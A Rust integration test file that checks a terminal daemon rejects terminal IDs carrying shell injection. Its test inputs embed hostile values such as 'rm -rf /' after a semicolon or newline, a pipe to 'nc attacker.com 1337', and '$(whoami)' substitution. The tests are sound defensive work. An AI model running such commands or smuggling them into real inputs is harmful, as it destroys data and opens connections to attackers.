// Security integration tests - expect/unwrap are acceptable here since tests should panic on failure
#![allow(clippy::expect_used)]
#![allow(clippy::unwrap_used)]

mod common;

use common::{cleanup_all_loom_sessions, TestClient, TestDaemon};
use serial_test::serial;

/// Cleanup helper to run before/after tests
fn setup() {
    cleanup_all_loom_sessions();
}

/// Security Test 1: Reject terminal ID with shell injection characters (semicolon)
#[tokio::test]
#[serial]
async fn test_reject_injection_semicolon() {
    setup();

    let daemon = TestDaemon::start().await.expect("Failed to start daemon");
    let mut client = TestClient::connect(daemon.socket_path())
        .await
        .expect("Failed to connect");

    // Attempt to create terminal with malicious ID containing semicolon
    let malicious_id = "normal; rm -rf /";
    let result = client.create_terminal(malicious_id, None).await;

    // Should fail with validation error
    assert!(result.is_err(), "Terminal creation with semicolon should be rejected");

    // Cleanup
    cleanup_all_loom_sessions();
}

/// Security Test 2: Reject terminal ID with command substitution
#[tokio::test]
#[serial]
async fn test_reject_injection_command_substitution() {
    setup();

    let daemon = TestDaemon::start().await.expect("Failed to start daemon");
    let mut client = TestClient::connect(daemon.socket_path())
        .await
        .expect("Failed to connect");

    // Attempt with $() command substitution
    let malicious_id = "$(whoami)";
    let result = client.create_terminal(malicious_id, None).await;

    assert!(
        result.is_err(),
        "Terminal creation with command substitution should be rejected"
    );

    // Cleanup
    cleanup_all_loom_sessions();
}

/// Security Test 3: Reject terminal ID with pipe character
#[tokio::test]
#[serial]
async fn test_reject_injection_pipe() {
    setup();

    let daemon = TestDaemon::start().await.expect("Failed to start daemon");
    let mut client = TestClient::connect(daemon.socket_path())
        .await
        .expect("Failed to connect");

    // Attempt with pipe
    let malicious_id = "terminal|nc attacker.com 1337";
    let result = client.create_terminal(malicious_id, None).await;

    assert!(result.is_err(), "Terminal creation with pipe should be rejected");

    // Cleanup
    cleanup_all_loom_sessions();
}

/// Security Test 4: Reject terminal ID with backticks
#[tokio::test]
#[serial]
async fn test_reject_injection_backticks() {
    setup();

    let daemon = TestDaemon::start().await.expect("Failed to start daemon");
    let mut client = TestClient::connect(daemon.socket_path())
        .await
        .expect("Failed to connect");

    // Attempt with backtick command substitution
    let malicious_id = "`whoami`";
    let result = client.create_terminal(malicious_id, None).await;

    assert!(result.is_err(), "Terminal creation with backticks should be rejected");

    // Cleanup
    cleanup_all_loom_sessions();
}

/// Security Test 5: Reject terminal ID with ampersand (background execution)
#[tokio::test]
#[serial]
async fn test_reject_injection_ampersand() {
    setup();

    let daemon = TestDaemon::start().await.expect("Failed to start daemon");
    let mut client = TestClient::connect(daemon.socket_path())
        .await
        .expect("Failed to connect");

    // Attempt with ampersand
    let malicious_id = "terminal & evil-command";
    let result = client.create_terminal(malicious_id, None).await;

    assert!(result.is_err(), "Terminal creation with ampersand should be rejected");

    // Cleanup
    cleanup_all_loom_sessions();
}

/// Security Test 6: Reject terminal ID with newline
#[tokio::test]
#[serial]
async fn test_reject_injection_newline() {
    setup();

    let daemon = TestDaemon::start().await.expect("Failed to start daemon");
    let mut client = TestClient::connect(daemon.socket_path())
        .await
        .expect("Failed to connect");

    // Attempt with newline injection
    let malicious_id = "terminal\nrm -rf /";
    let result = client.create_terminal(malicious_id, None).await;

    assert!(result.is_err(), "Terminal creation with newline should be rejected");

    // Cleanup
    cleanup_all_loom_sessions();
}

/// Security Test 7: Reject empty terminal ID
#[tokio::test]
#[serial]
async fn test_reject_empty_id() {
    setup();

    let daemon = TestDaemon::start().await.expect("Failed to start daemon");
    let mut client = TestClient::connect(daemon.socket_path())
        .await
        .expect("Failed to connect");

    // Attempt with empty ID
    let result = client.create_terminal("", None).await;

    assert!(result.is_err(), "Empty terminal ID should be rejected");

    // Cleanup
    cleanup_all_loom_sessions();
}

/// Security Test 8: Accept valid terminal IDs with allowed characters
#[tokio::test]
#[serial]
async fn test_accept_valid_ids() {
    setup();

    let daemon = TestDaemon::start().await.expect("Failed to start daemon");
    let mut client = TestClient::connect(daemon.socket_path())
        .await
        .expect("Failed to connect");

    // Test various valid IDs
    let valid_ids = vec![
        "terminal-1",
        "terminal_2",
        "TERMINAL-3",
        "Terminal_4",
        "term123",
        "123term",
        "a-b-c_d_e",
    ];

    for id in valid_ids {
        let result = client.create_terminal(id, None).await;
        assert!(result.is_ok(), "Valid terminal ID '{id}' should be accepted");
    }

    // Cleanup
    cleanup_all_loom_sessions();
}

/// Security Test 9: Reject terminal ID with special shell characters
#[tokio::test]
#[serial]
async fn test_reject_various_shell_chars() {
    setup();

    let daemon = TestDaemon::start().await.expect("Failed to start daemon");
    let mut client = TestClient::connect(daemon.socket_path())
        .await
        .expect("Failed to connect");

    // Test various problematic characters
    let malicious_chars = vec![
        "terminal>file",
        "terminal<file",
        "terminal*",
        "terminal?",
        "terminal[0]",
        "terminal{1}",
        "terminal'test'",
        "terminal\"test\"",
        "terminal\\test",
        "terminal/test",
        "terminal.test", // dots are commonly used in identifiers, but not allowed here
        "terminal@test", // @ is also risky
        "terminal#test", // # starts comments in shells
    ];

    for malicious_id in malicious_chars {
        let result = client.create_terminal(malicious_id, None).await;
        assert!(
            result.is_err(),
            "Terminal ID with special character '{malicious_id}' should be rejected"
        );
    }

    // Cleanup
    cleanup_all_loom_sessions();
}
